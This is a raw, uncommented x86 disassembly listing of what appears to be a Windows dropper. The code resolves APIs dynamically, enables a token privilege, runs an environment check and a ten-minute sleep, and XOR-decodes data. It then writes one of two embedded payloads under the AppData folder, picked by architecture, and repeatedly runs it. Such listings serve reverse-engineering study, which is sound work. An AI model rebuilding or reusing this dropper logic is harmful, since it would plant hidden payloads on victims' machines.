  401e7f:	89 45 e0             	mov    %eax,-0x20(%ebp)
  401e82:	b8 4b d6 41 00       	mov    $0x41d64b,%eax
  401e87:	50                   	push   %eax
  401e88:	e8 eb 04 00 00       	call   0x402378
  401e8d:	b9 58 d6 41 00       	mov    $0x41d658,%ecx
  401e92:	51                   	push   %ecx
  401e93:	50                   	push   %eax
  401e94:	e8 e7 04 00 00       	call   0x402380
  401e99:	89 45 dc             	mov    %eax,-0x24(%ebp)
  401e9c:	b8 01 00 00 00       	mov    $0x1,%eax
  401ea1:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401ea4:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401ea7:	83 c0 04             	add    $0x4,%eax
  401eaa:	83 c0 08             	add    $0x8,%eax
  401ead:	b9 02 00 00 00       	mov    $0x2,%ecx
  401eb2:	89 08                	mov    %ecx,(%eax)
  401eb4:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401eb7:	83 c0 04             	add    $0x4,%eax
  401eba:	50                   	push   %eax
  401ebb:	8b 45 08             	mov    0x8(%ebp),%eax
  401ebe:	50                   	push   %eax
  401ebf:	b8 00 00 00 00       	mov    $0x0,%eax
  401ec4:	50                   	push   %eax
  401ec5:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401ec8:	ff d0                	call   *%eax
  401eca:	85 c0                	test   %eax,%eax
  401ecc:	0f 84 05 00 00 00    	je     0x401ed7
  401ed2:	e9 0a 00 00 00       	jmp    0x401ee1
  401ed7:	e8 4c 05 00 00       	call   0x402428
  401edc:	e9 8a 00 00 00       	jmp    0x401f6b
  401ee1:	e8 0a 05 00 00       	call   0x4023f0
  401ee6:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  401ee9:	51                   	push   %ecx
  401eea:	b9 20 00 00 00       	mov    $0x20,%ecx
  401eef:	51                   	push   %ecx
  401ef0:	50                   	push   %eax
  401ef1:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401ef4:	ff d0                	call   *%eax
  401ef6:	85 c0                	test   %eax,%eax
  401ef8:	0f 84 05 00 00 00    	je     0x401f03
  401efe:	e9 0a 00 00 00       	jmp    0x401f0d
  401f03:	e8 20 05 00 00       	call   0x402428
  401f08:	e9 5e 00 00 00       	jmp    0x401f6b
  401f0d:	b8 00 00 00 00       	mov    $0x0,%eax
  401f12:	50                   	push   %eax
  401f13:	b8 00 00 00 00       	mov    $0x0,%eax
  401f18:	50                   	push   %eax
  401f19:	b8 10 00 00 00       	mov    $0x10,%eax
  401f1e:	50                   	push   %eax
  401f1f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  401f22:	50                   	push   %eax
  401f23:	b8 00 00 00 00       	mov    $0x0,%eax
  401f28:	50                   	push   %eax
  401f29:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401f2c:	50                   	push   %eax
  401f2d:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401f30:	ff d0                	call   *%eax
  401f32:	85 c0                	test   %eax,%eax
  401f34:	0f 84 05 00 00 00    	je     0x401f3f
  401f3a:	e9 19 00 00 00       	jmp    0x401f58
  401f3f:	e8 e4 04 00 00       	call   0x402428
  401f44:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401f47:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401f4a:	50                   	push   %eax
  401f4b:	e8 60 04 00 00       	call   0x4023b0
  401f50:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401f53:	e9 13 00 00 00       	jmp    0x401f6b
  401f58:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401f5b:	50                   	push   %eax
  401f5c:	e8 4f 04 00 00       	call   0x4023b0
  401f61:	b8 00 00 00 00       	mov    $0x0,%eax
  401f66:	e9 00 00 00 00       	jmp    0x401f6b
  401f6b:	c9                   	leave
  401f6c:	c3                   	ret
  401f6d:	55                   	push   %ebp
  401f6e:	89 e5                	mov    %esp,%ebp
  401f70:	81 ec 14 00 00 00    	sub    $0x14,%esp
  401f76:	90                   	nop
  401f77:	b8 6e d6 41 00       	mov    $0x41d66e,%eax
  401f7c:	50                   	push   %eax
  401f7d:	e8 f6 03 00 00       	call   0x402378
  401f82:	b9 78 d6 41 00       	mov    $0x41d678,%ecx
  401f87:	51                   	push   %ecx
  401f88:	50                   	push   %eax
  401f89:	e8 f2 03 00 00       	call   0x402380
  401f8e:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401f91:	8b 45 08             	mov    0x8(%ebp),%eax
  401f94:	50                   	push   %eax
  401f95:	b8 86 d6 41 00       	mov    $0x41d686,%eax
  401f9a:	50                   	push   %eax
  401f9b:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401f9e:	50                   	push   %eax
  401f9f:	e8 d2 fc ff ff       	call   0x401c76
  401fa4:	83 c4 0c             	add    $0xc,%esp
  401fa7:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401faa:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401fad:	85 c0                	test   %eax,%eax
  401faf:	0f 84 08 00 00 00    	je     0x401fbd
  401fb5:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401fb8:	e9 48 00 00 00       	jmp    0x402005
  401fbd:	b8 f0 d6 41 00       	mov    $0x41d6f0,%eax
  401fc2:	50                   	push   %eax
  401fc3:	e8 7c fe ff ff       	call   0x401e44
  401fc8:	83 c4 04             	add    $0x4,%esp
  401fcb:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401fce:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401fd1:	83 f8 00             	cmp    $0x0,%eax
  401fd4:	0f 85 1d 00 00 00    	jne    0x401ff7
  401fda:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401fdd:	50                   	push   %eax
  401fde:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401fe1:	ff d0                	call   *%eax
  401fe3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401fe6:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401fe9:	50                   	push   %eax
  401fea:	e8 0e fe ff ff       	call   0x401dfd
  401fef:	83 c4 04             	add    $0x4,%esp
  401ff2:	e9 06 00 00 00       	jmp    0x401ffd
  401ff7:	8b 45 f4             	mov    -0xc(%ebp),%eax
  401ffa:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401ffd:	8b 45 f0             	mov    -0x10(%ebp),%eax
  402000:	e9 00 00 00 00       	jmp    0x402005
  402005:	c9                   	leave
  402006:	c3                   	ret
  402007:	55                   	push   %ebp
  402008:	89 e5                	mov    %esp,%ebp
  40200a:	81 ec 0c 00 00 00    	sub    $0xc,%esp
  402010:	90                   	nop
  402011:	b8 00 00 00 00       	mov    $0x0,%eax
  402016:	50                   	push   %eax
  402017:	b8 80 00 00 00       	mov    $0x80,%eax
  40201c:	50                   	push   %eax
  40201d:	b8 02 00 00 00       	mov    $0x2,%eax
  402022:	50                   	push   %eax
  402023:	b8 00 00 00 00       	mov    $0x0,%eax
  402028:	50                   	push   %eax
  402029:	b8 00 00 00 00       	mov    $0x0,%eax
  40202e:	50                   	push   %eax
  40202f:	b8 00 00 00 c0       	mov    $0xc0000000,%eax
  402034:	50                   	push   %eax
  402035:	8b 45 10             	mov    0x10(%ebp),%eax
  402038:	50                   	push   %eax
  402039:	e8 5a 03 00 00       	call   0x402398
  40203e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  402041:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402044:	83 f8 00             	cmp    $0x0,%eax
  402047:	0f 84 2f 00 00 00    	je     0x40207c
  40204d:	b8 00 00 00 00       	mov    $0x0,%eax
  402052:	50                   	push   %eax
  402053:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402056:	50                   	push   %eax
  402057:	8b 45 0c             	mov    0xc(%ebp),%eax
  40205a:	50                   	push   %eax
  40205b:	8b 45 08             	mov    0x8(%ebp),%eax
  40205e:	50                   	push   %eax
  40205f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402062:	50                   	push   %eax
  402063:	e8 40 03 00 00       	call   0x4023a8
  402068:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40206b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40206e:	50                   	push   %eax
  40206f:	e8 3c 03 00 00       	call   0x4023b0
  402074:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402077:	e9 0a 00 00 00       	jmp    0x402086
  40207c:	b8 00 00 00 00       	mov    $0x0,%eax
  402081:	e9 00 00 00 00       	jmp    0x402086
  402086:	c9                   	leave
  402087:	c3                   	ret
  402088:	55                   	push   %ebp
  402089:	89 e5                	mov    %esp,%ebp
  40208b:	81 ec 0c 00 00 00    	sub    $0xc,%esp
  402091:	90                   	nop
  402092:	b8 00 00 00 00       	mov    $0x0,%eax
  402097:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40209a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40209d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4020a0:	39 c8                	cmp    %ecx,%eax
  4020a2:	0f 8d 4c 00 00 00    	jge    0x4020f4
  4020a8:	e9 0d 00 00 00       	jmp    0x4020ba
  4020ad:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4020b0:	89 c1                	mov    %eax,%ecx
  4020b2:	83 c0 01             	add    $0x1,%eax
  4020b5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4020b8:	eb e0                	jmp    0x40209a
  4020ba:	8b 45 08             	mov    0x8(%ebp),%eax
  4020bd:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4020c0:	01 c8                	add    %ecx,%eax
  4020c2:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4020c5:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4020c8:	01 d1                	add    %edx,%ecx
  4020ca:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4020cd:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4020d0:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4020d3:	b9 07 00 00 00       	mov    $0x7,%ecx
  4020d8:	99                   	cltd
  4020d9:	f7 f9                	idiv   %ecx
  4020db:	c1 e2 02             	shl    $0x2,%edx
  4020de:	8b 45 10             	mov    0x10(%ebp),%eax
  4020e1:	01 d0                	add    %edx,%eax
  4020e3:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4020e6:	0f be 09             	movsbl (%ecx),%ecx
  4020e9:	8b 10                	mov    (%eax),%edx
  4020eb:	31 d1                	xor    %edx,%ecx
  4020ed:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4020f0:	88 08                	mov    %cl,(%eax)
  4020f2:	eb b9                	jmp    0x4020ad
  4020f4:	c9                   	leave
  4020f5:	c3                   	ret
  4020f6:	55                   	push   %ebp
  4020f7:	89 e5                	mov    %esp,%ebp
  4020f9:	81 ec 18 03 00 00    	sub    $0x318,%esp
  4020ff:	90                   	nop
  402100:	b8 00 00 00 00       	mov    $0x0,%eax
  402105:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402108:	b8 00 00 00 00       	mov    $0x0,%eax
  40210d:	88 85 f5 fe ff ff    	mov    %al,-0x10b(%ebp)
  402113:	b8 fe 00 00 00       	mov    $0xfe,%eax
  402118:	50                   	push   %eax
  402119:	b8 00 00 00 00       	mov    $0x0,%eax
  40211e:	50                   	push   %eax
  40211f:	8d 85 f6 fe ff ff    	lea    -0x10a(%ebp),%eax
  402125:	50                   	push   %eax
  402126:	e8 5d 02 00 00       	call   0x402388
  40212b:	83 c4 0c             	add    $0xc,%esp
  40212e:	b8 00 00 00 00       	mov    $0x0,%eax
  402133:	88 85 f5 fc ff ff    	mov    %al,-0x30b(%ebp)
  402139:	b8 ff 01 00 00       	mov    $0x1ff,%eax
  40213e:	50                   	push   %eax
  40213f:	b8 00 00 00 00       	mov    $0x0,%eax
  402144:	50                   	push   %eax
  402145:	8d 85 f6 fc ff ff    	lea    -0x30a(%ebp),%eax
  40214b:	50                   	push   %eax
  40214c:	e8 37 02 00 00       	call   0x402388
  402151:	83 c4 0c             	add    $0xc,%esp
  402154:	b8 00 00 00 00       	mov    $0x0,%eax
  402159:	89 85 f0 fc ff ff    	mov    %eax,-0x310(%ebp)
  40215f:	b8 00 00 00 00       	mov    $0x0,%eax
  402164:	89 85 ec fc ff ff    	mov    %eax,-0x314(%ebp)
  40216a:	e9 18 00 00 00       	jmp    0x402187
  40216f:	b8 38 d7 41 00       	mov    $0x41d738,%eax
  402174:	50                   	push   %eax
  402175:	e8 f3 fd ff ff       	call   0x401f6d
  40217a:	83 c4 04             	add    $0x4,%esp
  40217d:	b8 01 00 00 00       	mov    $0x1,%eax
  402182:	e9 73 01 00 00       	jmp    0x4022fa
  402187:	b8 76 1a 40 00       	mov    $0x401a76,%eax
  40218c:	50                   	push   %eax
  40218d:	e8 ae 02 00 00       	call   0x402440
  402192:	e8 08 f9 ff ff       	call   0x401a9f
  402197:	85 c0                	test   %eax,%eax
  402199:	0f 84 0a 00 00 00    	je     0x4021a9
  40219f:	b8 00 00 00 00       	mov    $0x0,%eax
  4021a4:	e9 51 01 00 00       	jmp    0x4022fa
  4021a9:	8b 45 08             	mov    0x8(%ebp),%eax
  4021ac:	83 f8 02             	cmp    $0x2,%eax
  4021af:	0f 85 0b 00 00 00    	jne    0x4021c0
  4021b5:	b8 c0 27 09 00       	mov    $0x927c0,%eax
  4021ba:	50                   	push   %eax
  4021bb:	e8 20 02 00 00       	call   0x4023e0
  4021c0:	e8 95 f9 ff ff       	call   0x401b5a
  4021c5:	83 f8 20             	cmp    $0x20,%eax
  4021c8:	b8 00 00 00 00       	mov    $0x0,%eax
  4021cd:	0f 94 c0             	sete   %al
  4021d0:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4021d3:	b8 4c d7 41 00       	mov    $0x41d74c,%eax
  4021d8:	50                   	push   %eax
  4021d9:	e8 9a 01 00 00       	call   0x402378
  4021de:	b9 57 d7 41 00       	mov    $0x41d757,%ecx
  4021e3:	51                   	push   %ecx
  4021e4:	50                   	push   %eax
  4021e5:	e8 96 01 00 00       	call   0x402380
  4021ea:	89 85 e8 fc ff ff    	mov    %eax,-0x318(%ebp)
  4021f0:	b8 61 d7 41 00       	mov    $0x41d761,%eax
  4021f5:	50                   	push   %eax
  4021f6:	e8 7d 01 00 00       	call   0x402378
  4021fb:	b9 6d d7 41 00       	mov    $0x41d76d,%ecx
  402200:	51                   	push   %ecx
  402201:	50                   	push   %eax
  402202:	e8 79 01 00 00       	call   0x402380
  402207:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40220a:	b8 00 00 00 00       	mov    $0x0,%eax
  40220f:	50                   	push   %eax
  402210:	b8 1a 00 00 00       	mov    $0x1a,%eax
  402215:	50                   	push   %eax
  402216:	8d 85 f5 fe ff ff    	lea    -0x10b(%ebp),%eax
  40221c:	50                   	push   %eax
  40221d:	b8 00 00 00 00       	mov    $0x0,%eax
  402222:	50                   	push   %eax
  402223:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402226:	ff d0                	call   *%eax
  402228:	8d 85 f5 fe ff ff    	lea    -0x10b(%ebp),%eax
  40222e:	50                   	push   %eax
  40222f:	b8 85 d7 41 00       	mov    $0x41d785,%eax
  402234:	50                   	push   %eax
  402235:	8d 85 f5 fc ff ff    	lea    -0x30b(%ebp),%eax
  40223b:	50                   	push   %eax
  40223c:	8b 85 e8 fc ff ff    	mov    -0x318(%ebp),%eax
  402242:	ff d0                	call   *%eax
  402244:	8d 85 f5 fc ff ff    	lea    -0x30b(%ebp),%eax
  40224a:	50                   	push   %eax
  40224b:	e8 ba f9 ff ff       	call   0x401c0a
  402250:	83 c4 04             	add    $0x4,%esp
  402253:	89 85 ec fc ff ff    	mov    %eax,-0x314(%ebp)
  402259:	8b 85 ec fc ff ff    	mov    -0x314(%ebp),%eax
  40225f:	83 f8 00             	cmp    $0x0,%eax
  402262:	0f 85 59 00 00 00    	jne    0x4022c1
  402268:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40226b:	85 c0                	test   %eax,%eax
  40226d:	0f 84 1b 00 00 00    	je     0x40228e
  402273:	b8 df 30 40 00       	mov    $0x4030df,%eax
  402278:	89 85 f0 fc ff ff    	mov    %eax,-0x310(%ebp)
  40227e:	b8 80 c5 00 00       	mov    $0xc580,%eax
  402283:	89 85 ec fc ff ff    	mov    %eax,-0x314(%ebp)
  402289:	e9 16 00 00 00       	jmp    0x4022a4
  40228e:	b8 5f f6 40 00       	mov    $0x40f65f,%eax
  402293:	89 85 f0 fc ff ff    	mov    %eax,-0x310(%ebp)
  402299:	b8 80 df 00 00       	mov    $0xdf80,%eax
  40229e:	89 85 ec fc ff ff    	mov    %eax,-0x314(%ebp)
  4022a4:	8d 85 f5 fc ff ff    	lea    -0x30b(%ebp),%eax
  4022aa:	50                   	push   %eax
  4022ab:	8b 85 ec fc ff ff    	mov    -0x314(%ebp),%eax
  4022b1:	50                   	push   %eax
  4022b2:	8b 85 f0 fc ff ff    	mov    -0x310(%ebp),%eax
  4022b8:	50                   	push   %eax
  4022b9:	e8 49 fd ff ff       	call   0x402007
  4022be:	83 c4 0c             	add    $0xc,%esp
  4022c1:	8b 85 ec fc ff ff    	mov    -0x314(%ebp),%eax
  4022c7:	83 f8 00             	cmp    $0x0,%eax
  4022ca:	0f 84 1b 00 00 00    	je     0x4022eb
  4022d0:	8d 85 f5 fc ff ff    	lea    -0x30b(%ebp),%eax
  4022d6:	50                   	push   %eax
  4022d7:	b8 ee d7 41 00       	mov    $0x41d7ee,%eax
  4022dc:	50                   	push   %eax
  4022dd:	b8 96 d7 41 00       	mov    $0x41d796,%eax
  4022e2:	50                   	push   %eax
  4022e3:	e8 d8 f1 ff ff       	call   0x4014c0
  4022e8:	83 c4 0c             	add    $0xc,%esp
  4022eb:	e9 7f fe ff ff       	jmp    0x40216f
  4022f0:	b8 00 00 00 00       	mov    $0x0,%eax
  4022f5:	e9 00 00 00 00       	jmp    0x4022fa
  4022fa:	c9                   	leave
  4022fb:	c3                   	ret
  4022fc:	00 00                	add    %al,(%eax)
  4022fe:	00 00                	add    %al,(%eax)
  402300:	55                   	push   %ebp
  402301:	89 e5                	mov    %esp,%ebp
  402303:	81 ec 14 00 00 00    	sub    $0x14,%esp
  402309:	90                   	nop
  40230a:	b8 00 00 00 00       	mov    $0x0,%eax
  40230f:	89 45 ec             	mov    %eax,-0x14(%ebp)
  402312:	b8 00 00 03 00       	mov    $0x30000,%eax
  402317:	50                   	push   %eax
  402318:	b8 00 00 01 00       	mov    $0x10000,%eax
  40231d:	50                   	push   %eax
  40231e:	e8 25 01 00 00       	call   0x402448
  402323:	83 c4 08             	add    $0x8,%esp
  402326:	b8 01 00 00 00       	mov    $0x1,%eax
  40232b:	50                   	push   %eax
  40232c:	e8 1f 01 00 00       	call   0x402450
  402331:	83 c4 04             	add    $0x4,%esp
  402334:	8d 45 ec             	lea    -0x14(%ebp),%eax
  402337:	50                   	push   %eax
  402338:	b8 00 00 00 00       	mov    $0x0,%eax
  40233d:	50                   	push   %eax
  40233e:	8d 45 f4             	lea    -0xc(%ebp),%eax
  402341:	50                   	push   %eax
  402342:	8d 45 f8             	lea    -0x8(%ebp),%eax
  402345:	50                   	push   %eax
  402346:	8d 45 fc             	lea    -0x4(%ebp),%eax
  402349:	50                   	push   %eax
  40234a:	e8 09 01 00 00       	call   0x402458
  40234f:	83 c4 14             	add    $0x14,%esp
  402352:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402355:	50                   	push   %eax
  402356:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402359:	50                   	push   %eax
  40235a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40235d:	50                   	push   %eax
  40235e:	e8 93 fd ff ff       	call   0x4020f6
  402363:	83 c4 0c             	add    $0xc,%esp
  402366:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402369:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40236c:	50                   	push   %eax
  40236d:	e8 ee 00 00 00       	call   0x402460
  402372:	83 c4 04             	add    $0x4,%esp
  402375:	c9                   	leave
  402376:	c3                   	ret
  402377:	00 ff                	add    %bh,%bh
  402379:	25 5c d8 41 00       	and    $0x41d85c,%eax
  40237e:	00 00                	add    %al,(%eax)
  402380:	ff 25 60 d8 41 00    	jmp    *0x41d860
  402386:	00 00                	add    %al,(%eax)
  402388:	ff 25 ac d8 41 00    	jmp    *0x41d8ac
  40238e:	00 00                	add    %al,(%eax)
  402390:	ff 25 64 d8 41 00    	jmp    *0x41d864
  402396:	00 00                	add    %al,(%eax)
  402398:	ff 25 68 d8 41 00    	jmp    *0x41d868
  40239e:	00 00                	add    %al,(%eax)
  4023a0:	ff 25 b0 d8 41 00    	jmp    *0x41d8b0
  4023a6:	00 00                	add    %al,(%eax)
  4023a8:	ff 25 6c d8 41 00    	jmp    *0x41d86c
  4023ae:	00 00                	add    %al,(%eax)
  4023b0:	ff 25 70 d8 41 00    	jmp    *0x41d870
  4023b6:	00 00                	add    %al,(%eax)
  4023b8:	ff 25 b4 d8 41 00    	jmp    *0x41d8b4
  4023be:	00 00                	add    %al,(%eax)
  4023c0:	ff 25 74 d8 41 00    	jmp    *0x41d874
  4023c6:	00 00                	add    %al,(%eax)
  4023c8:	ff 25 b8 d8 41 00    	jmp    *0x41d8b8
  4023ce:	00 00                	add    %al,(%eax)
  4023d0:	ff 25 bc d8 41 00    	jmp    *0x41d8bc
  4023d6:	00 00                	add    %al,(%eax)
  4023d8:	ff 25 c0 d8 41 00    	jmp    *0x41d8c0
  4023de:	00 00                	add    %al,(%eax)
  4023e0:	ff 25 78 d8 41 00    	jmp    *0x41d878
  4023e6:	00 00                	add    %al,(%eax)
  4023e8:	ff 25 7c d8 41 00    	jmp    *0x41d87c
  4023ee:	00 00                	add    %al,(%eax)
  4023f0:	ff 25 80 d8 41 00    	jmp    *0x41d880
  4023f6:	00 00                	add    %al,(%eax)
  4023f8:	ff 25 84 d8 41 00    	jmp    *0x41d884
  4023fe:	00 00                	add    %al,(%eax)
  402400:	ff 25 88 d8 41 00    	jmp    *0x41d888
  402406:	00 00                	add    %al,(%eax)
  402408:	ff 25 8c d8 41 00    	jmp    *0x41d88c
  40240e:	00 00                	add    %al,(%eax)
  402410:	ff 25 90 d8 41 00    	jmp    *0x41d890
  402416:	00 00                	add    %al,(%eax)
  402418:	ff 25 94 d8 41 00    	jmp    *0x41d894
  40241e:	00 00                	add    %al,(%eax)
  402420:	ff 25 98 d8 41 00    	jmp    *0x41d898
  402426:	00 00                	add    %al,(%eax)
  402428:	ff 25 9c d8 41 00    	jmp    *0x41d89c
  40242e:	00 00                	add    %al,(%eax)
  402430:	ff 25 c4 d8 41 00    	jmp    *0x41d8c4
  402436:	00 00                	add    %al,(%eax)
  402438:	ff 25 a0 d8 41 00    	jmp    *0x41d8a0
  40243e:	00 00                	add    %al,(%eax)
  402440:	ff 25 a4 d8 41 00    	jmp    *0x41d8a4
  402446:	00 00                	add    %al,(%eax)
  402448:	ff 25 c8 d8 41 00    	jmp    *0x41d8c8
  40244e:	00 00                	add    %al,(%eax)
  402450:	ff 25 cc d8 41 00    	jmp    *0x41d8cc
  402456:	00 00                	add    %al,(%eax)
  402458:	ff 25 d0 d8 41 00    	jmp    *0x41d8d0
  40245e:	00 00                	add    %al,(%eax)
  402460:	ff 25 d4 d8 41 00    	jmp    *0x41d8d4
	...
